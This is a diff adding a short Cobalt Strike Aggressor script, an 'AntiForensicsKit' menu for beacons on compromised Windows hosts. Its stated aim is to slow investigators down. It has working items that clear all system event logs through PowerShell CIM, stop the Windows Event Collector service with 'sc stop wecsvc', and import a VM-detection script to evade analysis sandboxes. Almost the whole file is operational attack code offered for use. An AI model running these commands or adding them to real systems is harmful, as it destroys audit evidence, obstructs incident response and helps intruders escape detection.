@@ -1,0 +1,32 @@
+# Actions in this kit center around antiforensics. If it slows an investigator down, it likely belongs in this kit. We all know antiforensics is best forensics
+# @Und3rf10w
+
+popup beacon_bottom {
+	menu "AntiForensicsKit" {
+		menu "Windows" {
+			item "Clear System Event Logs (psh)"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+					bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+				}
+			}
+			item "Stop Windows Event Collector svc"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "sc stop wecsvc");
+					bshell($1, "sc stop wecsvc");
+				}
+			}
+			item "Check VM" {
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "powershell-import Check-VM.ps1");
+					bpowershell_import($1, script_resource("scripts/Check-VM.ps1"));
+					binput($1, "powershell Check-VM");
+					bpowershell($1, "Check-VM");
+				}
+			}
+		}
+	}
+}
